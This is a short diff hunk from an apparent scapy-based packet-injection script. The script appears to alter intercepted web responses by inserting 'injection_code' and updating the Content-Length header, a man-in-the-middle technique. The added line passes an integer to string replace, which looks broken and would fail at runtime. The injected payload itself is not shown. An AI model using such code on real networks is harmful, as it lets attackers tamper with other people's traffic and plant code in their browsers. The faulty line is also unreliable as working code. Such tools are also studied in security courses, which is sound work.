@@ -33,6 +33,7 @@ def process_packet(packet):
 #group(1) matches second item from entire str above (\d*) digits
                 content_length = content_length_search.group(1)
                 new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, new_content_length)
 #if state if load is not the same as the scapy packet Raw layer load then modify the packet
         if load != scapy_packet[scapy.Raw].load:
 #create new packet by replacing captured scapy_packet with the new modified load
